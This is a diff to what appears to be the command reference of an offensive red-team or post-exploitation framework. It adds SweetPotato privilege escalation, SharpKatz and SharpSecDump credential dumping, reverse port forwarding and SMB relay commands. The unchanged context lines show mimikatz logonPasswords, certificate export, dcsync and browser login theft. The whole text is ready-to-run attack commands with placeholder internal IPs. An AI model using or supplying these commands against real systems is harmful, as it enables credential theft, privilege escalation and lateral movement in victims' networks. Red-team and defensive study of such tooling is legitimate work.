@@ -265,6 +265,7 @@ sharpcookiemonster
 sharpdpapi machinetriage
 sharpchrome logins
 sweetpotato -p c:\\users\\public\\startup.exe
+sweetpotato -e 1 -oip 192.168.161.154 -c 42CBFAA7-A4A7-47BB-B422-BD10E9D02700
 stickynotesextract
 filegrep <path> <file mask> <regex> <recurse>
 filegrep \\server\\share *.* credential: true
@@ -287,6 +288,10 @@ mimikatz SamDump
 mimikatz Command "privilege::debug sekurlsa::logonPasswords"
 mimikatz Command "\\"crypto::capi\\" \\"crypto::certificates /export\\""
 dcsync <domain.fqdn> <user>
+sharpkatz --help
+sharpkatz --command logonpasswords
+sharpkatz --command ekeys
+sharpsecdump -target="127.0.0.1"
 
 * Dumping Active Directory:
 ============================
@@ -383,6 +388,11 @@ stopdaisy
 sharpsocks
 sharpsocks --verbose
 stopsocks
+sharpreverseforwarding newrportfwd 445 192.168.161.155 8445
+sharpreverseforwarding delete 8445
+sharpreverseforwarding listrportfwds
+sharprelay randomservice C:\\Windows\\temp\\WinDivert64.sys 445 8445
+sharprelay uninstall randomservice
 
 * Bloodhound (In Memory only):
 ===============================
